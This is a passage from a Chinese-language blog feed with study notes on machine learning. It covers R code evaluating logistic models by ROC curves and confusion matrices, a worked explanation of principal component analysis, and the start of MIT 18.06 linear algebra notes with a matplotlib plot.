0.7034</p><blockquote><p>plot(train_roc)</p></blockquote><blockquote><p>test_roc &lt;- roc(test_data$atRisk,test_pred)</p></blockquote><p>Setting levels: control = FALSE, case = TRUE</p><p>Setting direction: controls &lt; cases</p><blockquote></blockquote><blockquote><p>auc(test_roc)</p></blockquote><p>Area under the curve: 0.7135</p><blockquote><p>plot(test_roc)</p></blockquote><p>![](file:///C:/Users/GUOXIA~1/AppData/Local/Temp/msohtmlclip1/01/clip_image012.png)</p><p>Fit 模型训练集 ROC 曲线</p><p>![](file:///C:/Users/GUOXIA~1/AppData/Local/Temp/msohtmlclip1/01/clip_image014.png)</p><p>Fit 模型测试集 ROC 曲线</p><p>我们通过 ROC 曲线来获取最佳阈值。</p><blockquote><p>coords_test &lt;- coords(test_roc, “best”)</p></blockquote><blockquote><p>coords_test</p></blockquote><p>threshold specificity sensitivity</p><p>1 0.02988667   0.9086334   0.4583333</p><p>并根据此建立混淆矩阵计算精度，准确率和召回率以及 F-score。</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>&gt; predicted_labels_test &lt;- ifelse(test_pred &gt;= best_threshold,TRUE,FALSE)<br><br>&gt; confusion_matrix &lt;- table(predicted_labels_test, test_data$atRisk)<br><br>&gt; confusion_matrix<br><br>                     predicted_labels_test FALSE TRUE<br><br>                FALSE  4694   52<br><br>                TRUE    472   44<br><br>&gt; accuracy &lt;- (confusion_matrix[1, 1] + confusion_matrix[2, 2]) / sum(confusion_matrix)<br><br>&gt; recall &lt;- confusion_matrix[2, 2] / (confusion_matrix[2, 2] + confusion_matrix[2, 1])<br><br>&gt; cat(“Accuracy:”, accuracy, “\n”)<br><br>Accuracy: 0.9004181 <br><br>&gt; cat(“Recall:”, recall, “\n”)<br><br>Recall: 0.08527132 <br><br>&gt; precision &lt;- confusion_matrix[2, 2] / (confusion_matrix[2, 2] + confusion_matrix[1, 2])<br><br>&gt; f1_score &lt;- 2 * (precision * recall) / (precision + recall)<br><br>&gt; cat(“Precision:”, precision, “\n”)<br><br>Precision: 0.4583333 <br><br>&gt; cat(“F1 Score:”, f1_score, “\n”)<br><br>F1 Score: 0.1437908</td></tr></tbody></table><p>通过上述来看，筛选了一部分非显著性因素建立的模型精度较为高，但是召回率和准确率相对较低，这也导致了其 F-score 很低。这可能会导致很多漏判误判的情况。</p><p>下面作出双密度图：</p><blockquote><p>test_data$pred &lt;- test_pred</p></blockquote><blockquote><p>ggplot(data = test_data, aes(x = pred , fill = factor(atRisk))) +</p></blockquote><ul><li><p>geom_density(alpha = 0.5) +</p></li><li><p>labs(x = “Predicted Probabilities”, y = “Density”) +</p></li><li><p>ggtitle(“Dual Density Plot of Predicted Probabilities”)</p></li></ul><p>![](file:///C:/Users/GUOXIA~1/AppData/Local/Temp/msohtmlclip1/01/clip_image016.png)</p><p>Fit 模型预测双密度图</p><p>可以看出图中有以下特征。</p><p>“FALSE” 类的预测概率主要集中在 0 附近，这表明模型对于这类的预测非常有信心，认为它们几乎不可能是 “TRUE”。</p><p>“TRUE” 类的预测概率分布则相对更平坦，但大多数预测值仍然靠近 0。</p><p>在预测概率较低的区域（接近 0），两个分类的曲线有所重叠，这意味着在这些概率值下，模型在区分 “TRUE” 和 “FALSE” 上存在一定的不确定性。</p><p>这里我也对先前建立的概括了全部因素的模型 mod 进行了相同的操作，分别对其在测试数据集下的性能做出了评价。</p><p>![](file:///C:/Users/GUOXIA~1/AppData/Local/Temp/msohtmlclip1/01/clip_image018.png)</p><p>Mod 模型测试集 ROC 曲线</p><p>对其取最佳阈值并建立混淆矩阵查看</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>&gt; coords_test_sum &lt;- coords(roc_curve, “best”)<br><br>&gt; coords_test_sum  <br><br>   threshold specificity sensitivity<br><br>1 0.01760564   0.7667441     0.59375<br><br>&gt; best_threshold_sum &lt;- 0.01760564<br><br>&gt; predicted_labels_test_sum &lt;- ifelse(sum_testpred &gt;= best_threshold_sum , TRUE, FALSE)<br><br>&gt; confusion_matrix_sum &lt;- table(predicted_labels_test_sum , test_data$atRisk)<br><br>&gt; confusion_matrix_sum <br><br>                         predicted_labels_test_sum FALSE TRUE<br><br>                    FALSE  3961   39<br><br>                    TRUE   1205   57<br><br>&gt; accuracy_sum &lt;- (confusion_matrix_sum [1, 1] + confusion_matrix_sum [2, 2]) / sum(confusion_matrix_sum )<br><br>&gt; accuracy_sum <br><br>[1] 0.763588<br><br>&gt; recall_sum &lt;- confusion_matrix_sum [2, 2] / (confusion_matrix_sum [2, 2] + confusion_matrix_sum [2, 1])<br><br>&gt; recall_sum<br><br>[1] 0.0451664</td></tr></tbody></table><p>可以发现其召回率和准确率相对于 Fit 模型都低，这里可以得出提取主要因素对模型的性能还是有一定程度上的优化的，如果能够筛选出最相关的因素进行建模，模型的性能也会一定程度的提升。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主成分析+奇异值分解</title>
      <link href="/2023/12/10/%E4%B8%BB%E6%88%90%E5%88%86%E6%9E%90+%E5%A5%87%E5%BC%82%E5%80%BC%E5%88%86%E8%A7%A3/"/>
      <url>/2023/12/10/%E4%B8%BB%E6%88%90%E5%88%86%E6%9E%90+%E5%A5%87%E5%BC%82%E5%80%BC%E5%88%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="主成分析"><a class="markdownIt-Anchor" href="#主成分析">#</a> 主成分析</h2><h3 id="一背景"><a class="markdownIt-Anchor" href="#一背景">#</a> 一，背景</h3><p>在现在很多的领域的研究和应用中，往往需要对反映事物的多个变量进行大量的观测，收集较多的数据来进行分析。多变量大样本会对研究和应用提供了丰富的信息，一定程度上增加了数据采集工作量，许多变量可能存在相关性，从而增加了问题分析的复杂性。<br>需要找到一个合理的方法，在减少需要分析的指标同时，尽量减少原来指标包含信息的损失，以到达对收集数据进行全面分析的目的。由于各个变量之间存在相关关系，因此可能用比较少的综合指标分别综合存在于各变量中的各类信息。主成分分析与因子分析就属于这类降维的方法。</p><h3 id="二问题描述"><a class="markdownIt-Anchor" href="#二问题描述">#</a> 二，问题描述</h3><p>比方说某些学生的各个成绩统计：<br><img src="https://img-blog.csdn.net/20150304195359136" alt="成绩"><br>首先，假设这些科目成绩不相关，也就是说某一科目考多少分与其他科目没有关系。那么一眼就能看出来，数学、物理、化学这三门课的成绩构成了这组数据的主成分（很显然，数学作为第一主成分，因为数学成绩拉的最开）。为什么一眼能看出来？因为坐标轴选对了！下面再看一组学生的数学、物理、化学、语文、历史、英语成绩统计，见表 2，还能不能一眼看出来：<br><img src="https://img-blog.csdn.net/20150304195508947" alt="数学成绩"><br>我们似乎无法直接看出这组数据的主成分，因为在坐标系下这组数据分布的很散乱。</p><h3 id="三数据降维"><a class="markdownIt-Anchor" href="#三数据降维">#</a> 三，数据降维</h3><p>为了说明什么是数据的主成分，先从数据降维开始。降维其实就是把高维空间内的一系列点观察其是否有相关性，然后通过数据中心化（平移）和旋转的方式进行降维。一般来说 n 维空间的 n 个点一定能在 n-1 维子空间中分析。<br>上面所讲述的，认为在数据降维没有丢掉任何东西，因为这些数据在平面的第三个维度分量都为 0。现在假设这些数据在 z 轴有一些很小的抖动，那么我们仍然用上述的二维表示这些数据，理由是我们可以认为这两个轴的信息是数据的主成分，<br>PCA 的思想就是将 n 维特征映射到 k 维上，这 k 维是全新的正交特征。这 k 维特征称为主成分，是重新构造出来的 k 维特征，而不是简单地从 n 维特征中去除其余 n-k 维特征。</p><h3 id="pca实例"><a class="markdownIt-Anchor" href="#pca实例">#</a> PCA 实例</h3><p>![[Pasted image 20231210204106.png]]<br>   行代表了样例，列代表特征，这里有 10 个样例，每个样例两个特征。可以这样认为，有 10 篇文档，x 是 10 篇文档中 “learn” 出现的 TF-IDF，y 是 10 篇文档中 “study” 出现的 TF-IDF。<br>  <strong>第一步</strong>，分别求 x 和 y 的平均值，然后对于所有的样例，都减去对应的均值。这里 x 的均值是 1.81，y 的均值是 1.91，那么一个样例减去均值后即为（0.69,0.49），得到<br>  ![[Pasted image 20231210204123.png]]<br>       <strong>第二步</strong>，求特征协方差矩阵，如果数据是 3 维，那么协方差矩阵是<br>       ![[Pasted image 20231210204132.png]]<br>   这里只有 x 和 y，求解得<br>   对角线上分别是 x 和 y 的方差，非对角线上是协方差。协方差是衡量两个变量同时变化的变化程度。协方差大于 0 表示 x 和 y 若一个增，另一个也增；小于 0 表示一个增，一个减。如果ｘ和ｙ是统计独立的，那么二者之间的协方差就是０；但是协方差是０，并不能说明ｘ和ｙ是独立的。协方差绝对值越大，两者对彼此的影响越大，反之越小。协方差是没有单位的量，因此，如果同样的两个变量所采用的量纲发生变化，它们的协方差也会产生树枝上的变化。<br><strong>第三步</strong>，求协方差的特征值和特征向量，得到<br>！[[Pasted image 20231210204204.png]]<br> 上面是两个特征值，下面是对应的特征向量，特征值 0.0490833989 对应特征向量为，这里的特征向量都归一化为单位向量。<br><strong>第四步</strong>，将特征值按照从大到小的顺序排序，选择其中最大的 k 个，然后将其对应的 k 个特征向量分别作为列向量组成特征向量矩阵。<br>这里特征值只有两个，我们选择其中最大的那个，这里是 1.28402771，对应的特征向量是 (-0.677873399, -0.735178656) T。<br>第五步，将样本点投影到选取的特征向量上。假设样例数为 m，特征数为 n，减去均值后的样本矩阵为 DataAdjust (m<em>n)，协方差矩阵是 n</em>n，选取的 k 个特征向量组成的矩阵为 EigenVectors (n*k)。那么投影后的数据 FinalData 为</p><p>FinalData(10<em>1) = DataAdjust(10</em>2 矩阵) x 特征向量 (-0.677873399, -0.735178656) T<br>![[Pasted image 20231210204237.png]]<br> 这样，就将原始样例的 n 维特征变成了 k 维，这 k 维就是原始特征在 k 维上的投影。<br>上面的数据可以认为是 learn 和 study 特征融合为一个新的特征叫做 LS 特征，该特征基本上代表了这两个特征。上述过程如下图 2 描述</p><p><strong>总结一下就是求协方差矩阵，矩阵中方差大的（即那个向量方向上分散大的）可以认为是主要的特征，那么我们可以将数据投影到这个向量上。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能的数学基础</title>
      <link href="/2023/11/25/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/11/25/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<blockquote><p>作为课程的学习，顺便自己也学习一下机器学习的基础和相关的数学基础，巩固下基础吧。</p></blockquote><p>基础一定是线性代数。–先线性代数进行学习吧。课程为 MIT 18.06</p><h1 id="线性代数"><a class="markdownIt-Anchor" href="#线性代数">#</a> 线性代数</h1><h3 id="第一讲方程组的几何解释"><a class="markdownIt-Anchor" href="#第一讲方程组的几何解释">#</a> 第一讲：方程组的几何解释</h3><p>我们从求解线性方程组来开始这门课，从一个普通的例子讲起：方程组有 2 个未知数，一共有 2 个方程，分别来看方程组的 “行图像” 和 “列图像”。</p><p>有方程组<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2</mn><mi>x</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>x</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>+</mo><mn>2</mn><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mn>3</mn></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}2x&amp;-y&amp;=0\\-x&amp;+2y&amp;=3\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal">x</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">+</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，写作矩阵形式有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>x</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>y</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{bmatrix}2&amp;-1\\-1&amp;2\end{bmatrix}\begin{bmatrix}x\\y\end{bmatrix}=\begin{bmatrix}0\\3\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span>，通常我们把第一个矩阵称为系数矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>，将第二个矩阵称为向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>，将第三个矩阵称为向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>，于是线性方程组可以表示为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>x</mi><mo>=</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">Ax=b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>。<br>我们来看行图像，即直角坐标系中的图像：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line">x = [-<span class="number">2</span>, <span class="number">2</span>, -<span class="number">2</span>, <span class="number">2</span>]</span><br><span class="line">y = [-<span class="number">4</span>, <span class="number">4</span>, <span class="number">0.5</span>, <span class="number">2.5</span>]</span><br><span class="line"></span><br><span class="line">fig = plt.figure()</span><br><span class="line">plt.axhline(y=<span class="number">0</span>, c=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">plt.axvline(x=<span class="number">0</span>, c=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.plot(x[:<span class="number">2</span>], y[:<span class="number">2</span>], x[<span class="number">2</span>:], y[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">plt.draw()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/chapter01_1_0.png?raw=true" alt="演示"><br>上图是我们都很熟悉的直角坐标系中两直线相交的情况，接下来我们按列观察方程组<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>+</mo><mi>y</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">x\begin{bmatrix}2\\-1\end{bmatrix}+y\begin{bmatrix}-1\\2\end{bmatrix}=\begin{bmatrix}0\\3\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span>（我们把第一个向量称作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">col_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，第二个向量称作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">col_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，以表示第一列向量和第二列向量），要使得式子成立，需要第一个向量加上两倍的第二个向量，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>+</mo><mn>2</mn><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr></mtable><mo 